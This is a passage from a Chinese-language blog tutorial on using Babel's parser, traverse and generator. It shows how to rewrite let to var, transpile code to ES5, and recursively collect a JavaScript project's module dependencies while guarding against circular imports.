src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img.png"></p><blockquote><p>从上图的打印出的 ast 对象，我们可以很清晰的从 <code>ast.progarm.body</code> 的第一个看出第一行代码是一个 <code>VariableDeclaration(type)</code>，用到的关键字是 <code>let(kind)</code>，然后对应的初始值是<code> a(init.value)</code></p></blockquote><h1 id="把-let-变成-var"><a href="#把-let-变成-var" class="headerlink" title="把 let 变成 var"></a>把 let 变成 var</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&#x27;@babel/parser&#x27;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&#x27;@babel/traverse&#x27;</span></span><br><span class="line"><span class="keyword">import</span> generator <span class="keyword">from</span> <span class="string">&#x27;@babel/generator&#x27;</span></span><br><span class="line"></span><br><span class="line">const <span class="keyword">code</span> = `<span class="keyword">let</span> a = <span class="string">&#x27;a&#x27;</span>; <span class="keyword">let</span> b = <span class="string">&#x27;b&#x27;</span>`</span><br><span class="line">const ast = parse(<span class="keyword">code</span>, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">traverse(ast, &#123;</span><br><span class="line">    enter: item =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.node.type === <span class="string">&#x27;VariableDeclaration&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (item.node.kind === <span class="string">&#x27;let&#x27;</span>) &#123;</span><br><span class="line">                item.node.kind = <span class="string">&#x27;var&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">const result = generator(ast, &#123;&#125;, <span class="keyword">code</span>)</span><br><span class="line">console.log(result.<span class="keyword">code</span>)</span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_1.png"></p><blockquote><p>使用 <code>traverse</code>, <code>generator</code> 就能将 let 转换成 var</p></blockquote><ul><li><strong>为什么必须要用 AST</strong><br>1、你很难用正则表达式来替换，正则很容易把 <code>let a = &#39;a&#39;</code> 变成 <code>var a = &#39;a&#39;</code><br>2、你需要识别每个单词的意思，才能做到只修改用于变量声明的 let<br>3、而 AST 能明确的告诉你每个 let 的意思</li></ul><h1 id="将代码转为-ES5"><a href="#将代码转为-ES5" class="headerlink" title="将代码转为 ES5"></a>将代码转为 ES5</h1><p>我们可以直接使用现成的插件 <code>@babel/core</code></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&#x27;@babel/parser&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel <span class="keyword">from</span> <span class="string">&#x27;@babel/core&#x27;</span>;</span><br><span class="line"></span><br><span class="line">const <span class="keyword">code</span> = `<span class="keyword">let</span> a = <span class="string">&#x27;let&#x27;</span>; <span class="keyword">let</span> b = <span class="number">2</span>; const c = <span class="string">&#x27;c&#x27;</span>`</span><br><span class="line">const ast = parse(<span class="keyword">code</span>, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">const result = babel.transformFromAstSync(ast, <span class="keyword">code</span>, &#123;</span><br><span class="line">  presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">console.log(result.<span class="keyword">code</span>)</span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_2.png"></p><blockquote><p>现在我们已经能得到转换后的es5代码了，但是我们一般都是生成单独的文件<br>只需要稍微改造一下，引入 fs 模块，test.js 内容依旧为 <code>let a = &#39;let&#39;; let b = 2; const c = &#39;c&#39;</code></p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&#x27;@babel/parser&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel <span class="keyword">from</span> <span class="string">&#x27;@babel/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"></span><br><span class="line">const <span class="keyword">code</span> = fs.readFileSync(<span class="string">&#x27;./test.js&#x27;</span>).toString()</span><br><span class="line">const ast = parse(<span class="keyword">code</span>, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">const result = babel.transformFromAstSync(ast, <span class="keyword">code</span>, &#123;</span><br><span class="line">  presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">fs.writeFileSync(<span class="string">&#x27;./test.es5.js&#x27;</span>, result.<span class="keyword">code</span>)</span><br></pre></td></tr></table></figure><blockquote><p>代码已经移到 test.js 文件里了<br>运行 node -r ts-node&#x2F;register file_to_es5.ts<br>就会得到 test.es5.js 文件</p></blockquote><h1 id="分析-index-js-的依赖"><a href="#分析-index-js-的依赖" class="headerlink" title="分析 index.js 的依赖"></a>分析 index.js 的依赖</h1><h3 id="除了转换-JS-语法，还能做啥？"><a href="#除了转换-JS-语法，还能做啥？" class="headerlink" title="除了转换 JS 语法，还能做啥？"></a>除了转换 JS 语法，还能做啥？</h3><h5 id="用来分析-JS-文件的依赖关系"><a href="#用来分析-JS-文件的依赖关系" class="headerlink" title="用来分析 JS 文件的依赖关系"></a>用来分析 JS 文件的依赖关系</h5><p>创建一系列文件</p><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_3.png"></p><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_4.png"></p><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_5.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// deps_1.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置根目录</span></span><br><span class="line"><span class="keyword">const</span> projectRoot = <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;project_1&#x27;</span>)</span><br><span class="line"><span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DepRelation</span> = &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: &#123; <span class="attr">deps</span>: <span class="built_in">string</span>[], <span class="attr">code</span>: <span class="built_in">string</span> &#125; &#125;</span><br><span class="line"><span class="comment">// 初始化一个空的 depRelation，用于收集依赖</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">depRelation</span>: <span class="title class_">DepRelation</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span></span><br><span class="line"><span class="title function_">collectCodeAndDeps</span>(<span class="title function_">resolve</span>(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(depRelation)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">collectCodeAndDeps</span>(<span class="params">filepath: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="title function_">getProjectPath</span>(filepath) <span class="comment">// 文件的项目路径，如 index.js</span></span><br><span class="line">  <span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">readFileSync</span>(filepath).<span class="title function_">toString</span>()</span><br><span class="line">  <span class="comment">// 初始化 depRelation[key]</span></span><br><span class="line">  depRelation[key] = &#123; <span class="attr">deps</span>: [], <span class="attr">code</span>: code &#125;</span><br><span class="line">  <span class="comment">// 将代码转为 AST</span></span><br><span class="line">  <span class="keyword">const</span> ast = <span class="title function_">parse</span>(code, &#123; <span class="attr">sourceType</span>: <span class="string">&#x27;module&#x27;</span> &#125;) </span><br><span class="line">  <span class="comment">// 分析文件依赖，将内容放至 depRelation</span></span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="attr">enter</span>: <span class="function"><span class="params">path</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// path.node.source.value 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span></span><br><span class="line">        <span class="keyword">const</span> depAbsolutePath = <span class="title function_">resolve</span>(<span class="title function_">dirname</span>(filepath), path.<span class="property">node</span>.<span class="property">source</span>.<span class="property">value</span>)</span><br><span class="line">        <span class="comment">// 然后转为项目路径</span></span><br><span class="line">        <span class="keyword">const</span> depProjectPath = <span class="title function_">getProjectPath</span>(depAbsolutePath)</span><br><span class="line">        <span class="comment">// 把依赖写进 depRelation</span></span><br><span class="line">        depRelation[key].<span class="property">deps</span>.<span class="title function_">push</span>(depProjectPath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件相对于根目录的相对路径</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getProjectPath</span>(<span class="params">path: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">relative</span>(projectRoot, path).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码 <code>node -r ts-node/register deps_1.ts</code></p><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_6.png"></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.调用 collectCodeAndDeps(index.js)<br>2.先把 depRelation[‘index.js’] 初始化为 { deps: [], code: ‘index.js’ } （读取源代码简单，直接 fs 模块读取就好了，主要是 deps）<br>3.然后把 index.js 源码 code 变成 ast（只有转化为 ast 我们才知道哪些语句是 import）<br>4.遍历 ast，看看 import 了哪些依赖（path.node.type &#x3D;&#x3D;&#x3D; ‘ImportDeclaration’），假设依赖了 a.js 和 b.js<br>5.把 a.js 和 b.js 写到 depRelation[‘index’].deps 里<br>6.最终得到的 depRelation 就收集了 index.js 的依赖</p><h3 id="启发：用哈希表来储存未见依赖"><a href="#启发：用哈希表来储存未见依赖" class="headerlink" title="启发：用哈希表来储存未见依赖"></a>启发：用哈希表来储存未见依赖</h3><h1 id="递归地分析嵌套依赖"><a href="#递归地分析嵌套依赖" class="headerlink" title="递归地分析嵌套依赖"></a>递归地分析嵌套依赖</h1><h2 id="升级：依赖的关系"><a href="#升级：依赖的关系" class="headerlink" title="升级：依赖的关系"></a>升级：依赖的关系</h2><ul><li>三层依赖关系<br>1、index -&gt; a -&gt; dir&#x2F;a2 -&gt; dir&#x2F;dir_in_dir&#x2F;a3<br>2、index -&gt; b -&gt; dir&#x2F;b2 -&gt; dir&#x2F;dir_in_dir&#x2F;b3</li><li>思路<br>1、collectCodeAndDeps 太长了，缩写为 collect<br>2、调用 collect(‘index’)<br>3、发现依赖 ‘a.js’ 于是调用 collect(‘a.js’)<br>4、发现依赖 ‘.&#x2F;dir&#x2F;a2.js’ 于是调用 collect(‘dir&#x2F;a2.js’)<br>5、发现依赖 ‘.&#x2F;dir_in_dir&#x2F;s3.js’ 于是调用 collect(‘dir&#x2F;dir_in_dir&#x2F;s3.js’)<br>6、没有更多依赖了， a.js 这条线结束，发现下一个依赖 ‘.&#x2F;b.js’<br>7、以此类推，其实就是递归</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// deps_2.js // 只需要最后多加一句话</span></span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置根目录</span></span><br><span class="line"><span class="keyword">const</span> projectRoot = <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;project_2&#x27;</span>)</span><br><span class="line"><span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DepRelation</span> = &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: &#123; <span class="attr">deps</span>: <span class="built_in">string</span>[], <span class="attr">code</span>: <span class="built_in">string</span> &#125; &#125;</span><br><span class="line"><span class="comment">// 初始化一个空的 depRelation，用于收集依赖</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">depRelation</span>: <span class="title class_">DepRelation</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span></span><br><span class="line"><span class="title function_">collectCodeAndDeps</span>(<span class="title function_">resolve</span>(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(depRelation)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">collectCodeAndDeps</span>(<span class="params">filepath: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="title function_">getProjectPath</span>(filepath) <span class="comment">// 文件的项目路径，如 index.js</span></span><br><span class="line">  <span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">readFileSync</span>(filepath).<span class="title function_">toString</span>()</span><br><span class="line">  <span class="comment">// 初始化 depRelation[key]</span></span><br><span class="line">  depRelation[key] = &#123; <span class="attr">deps</span>: [], <span class="attr">code</span>: code &#125;</span><br><span class="line">  <span class="comment">// 将代码转为 AST</span></span><br><span class="line">  <span class="keyword">const</span> ast = <span class="title function_">parse</span>(code, &#123; <span class="attr">sourceType</span>: <span class="string">&#x27;module&#x27;</span> &#125;) </span><br><span class="line">  <span class="comment">// 分析文件依赖，将内容放至 depRelation</span></span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="attr">enter</span>: <span class="function"><span class="params">path</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// path.node.source.value 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span></span><br><span class="line">        <span class="keyword">const</span> depAbsolutePath = <span class="title function_">resolve</span>(<span class="title function_">dirname</span>(filepath), path.<span class="property">node</span>.<span class="property">source</span>.<span class="property">value</span>)</span><br><span class="line">        <span class="comment">// 然后转为项目路径</span></span><br><span class="line">        <span class="keyword">const</span> depProjectPath = <span class="title function_">getProjectPath</span>(depAbsolutePath)</span><br><span class="line">        <span class="comment">// 把依赖写进 depRelation</span></span><br><span class="line">        depRelation[key].<span class="property">deps</span>.<span class="title function_">push</span>(depProjectPath)</span><br><span class="line">        <span class="title function_">collectCodeAndDeps</span>(depAbsolutePath) <span class="comment">// 其实就多了这一句话</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件相对于根目录的相对路径</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getProjectPath</span>(<span class="params">path: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">relative</span>(projectRoot, path).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_7.png"></p><blockquote><p>但是递归存在 call stack 溢出的风险</p></blockquote><h1 id="在复杂一点：循环依赖"><a href="#在复杂一点：循环依赖" class="headerlink" title="在复杂一点：循环依赖"></a>在复杂一点：循环依赖</h1><ul><li>依赖关系<br>1、index -&gt; a -&gt; b<br>2、index -&gt; b -&gt; a</li></ul><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_8.png"></p><ul><li>求值<br>1、a.value &#x3D; b.value + 1<br>2、b.value &#x3D; a.value + 1<br>3、神经病…….</li></ul><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_9.png"></p><h2 id="这样子看来-不能循环依赖-？"><a href="#这样子看来-不能循环依赖-？" class="headerlink" title="这样子看来 [不能循环依赖]？"></a>这样子看来 [不能循环依赖]？</h2><h4 id="但是并不是这样，只是我们当前栗子确实有问题的，我们需要一些小技巧，是的循环依赖也合法"><a href="#但是并不是这样，只是我们当前栗子确实有问题的，我们需要一些小技巧，是的循环依赖也合法" class="headerlink" title="但是并不是这样，只是我们当前栗子确实有问题的，我们需要一些小技巧，是的循环依赖也合法"></a>但是并不是这样，只是我们当前栗子确实有问题的，我们需要一些小技巧，是的循环依赖也合法</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// deps_4.js // 只需要加上一个判断</span></span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置根目录</span></span><br><span class="line"><span class="keyword">const</span> projectRoot = <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;project_4&#x27;</span>)</span><br><span class="line"><span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DepRelation</span> = &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: &#123; <span class="attr">deps</span>: <span class="built_in">string</span>[], <span class="attr">code</span>: <span class="built_in">string</span> &#125; &#125;</span><br><span class="line"><span class="comment">// 初始化一个空的 depRelation，用于收集依赖</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">depRelation</span>: <span class="title class_">DepRelation</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span></span><br><span class="line"><span class="title function_">collectCodeAndDeps</span>(<span class="title function_">resolve</span>(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(depRelation)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">collectCodeAndDeps</span>(<span class="params">filepath: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="title function_">getProjectPath</span>(filepath) <span class="comment">// 文件的项目路径，如 index.js</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(depRelation).<span class="title function_">includes</span>(key))&#123; <span class="comment">// 只需要加上一个判断</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`duplicated dependency: <span class="subst">$&#123;key&#125;</span>`</span>) <span class="comment">// 注意，重复依赖不一定是循环依赖</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">readFileSync</span>(filepath).<span class="title function_">toString</span>()</span><br><span class="line">  <span class="comment">// 初始化 depRelation[key]</span></span><br><span class="line">  depRelation[key] = &#123; <span class="attr">deps</span>: [], <span class="attr">code</span>: code &#125;</span><br><span class="line">  <span class="comment">// 将代码转为 AST</span></span><br><span class="line">  <span class="keyword">const</span> ast = <span class="title function_">parse</span>(code, &#123; <span class="attr">sourceType</span>: <span class="string">&#x27;module&#x27;</span> &#125;) </span><br><span class="line">  <span class="comment">// 分析文件依赖，将内容放至 depRelation</span></span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="attr">enter</span>: <span class="function"><span class="params">path</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// path.node.source.value 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span></span><br><span class="line">        <span class="keyword">const</span> depAbsolutePath = <span class="title function_">resolve</span>(<span class="title function_">dirname</span>(filepath), path.<span class="property">node</span>.<span class="property">source</span>.<span class="property">value</span>)</span><br><span class="line">        <span class="comment">// 然后转为项目路径</span></span><br><span class="line">        <span class="keyword">const</span> depProjectPath = <span class="title function_">getProjectPath</span>(depAbsolutePath)</span><br><span class="line">        <span class="comment">// 把依赖写进 depRelation</span></span><br><span class="line">        depRelation[key].<span class="property">deps</span>.<span class="title function_">push</span>(depProjectPath)</span><br><span class="line">        <span class="title function_">collectCodeAndDeps</span>(depAbsolutePath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件相对于根目录的相对路径</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getProjectPath</span>(<span class="params">path: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">relative</span>(projectRoot, path).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>避免重复进入同一个文件</li><li>思路：<br>1、<strong>一旦发现这个 key 已经在 keys 里了，就 return</strong><br>2、这样分析过程就不是 a -&gt; b -&gt; a -&gt; b -&gt; …，而是 a -&gt; b -&gt; return<br>3、注意我们只需要<strong>分析依赖</strong>，不需要<strong>执行代码</strong>，所以这样子是可行的<br>4、由于我们的分析不需要执行代码，所以叫做<strong>静态分析</strong><br>5、但如果我们<strong>执行代码</strong>，就会发现还是出现了循环</li></ul><p><img src="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/img_10.png"></p><blockquote><p>执行发现报错：不能在 ‘a’ 初始化之前访问 a<br>原因：执行过程 a-&gt; b -&gt; a 此处报错，因为 node 发现计算 a 的时候又要计算 a</p></blockquote><h3 id="所以，结论"><a href="#所以，结论" class="headerlink" title="所以，结论"></a>所以，结论</h3><ul><li>模块间可以循环依赖<br>1、a 依赖 b，b 依赖 a<br>2、a 依赖 b，b 依赖 c，c 依赖 a</li><li>但不能有逻辑漏洞<br>1、a.value &#x3D; b.value + 1<br>2、b.value &#x3D; a.value + 1</li><li>那能不能写出一个没有逻辑漏洞的循环依赖呢？<br>1、当然可以</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> a.js</span><br><span class="line"><span class="keyword">import</span> b <span class="keyword">from</span> <span class="string">&#x27;./b.js&#x27;</span></span><br><span class="line">const a = &#123;</span><br><span class="line">  value: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  getB: <span class="function"><span class="params">()</span> =&gt;</span> b.value + <span class="string">&#x27; from a.js&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> 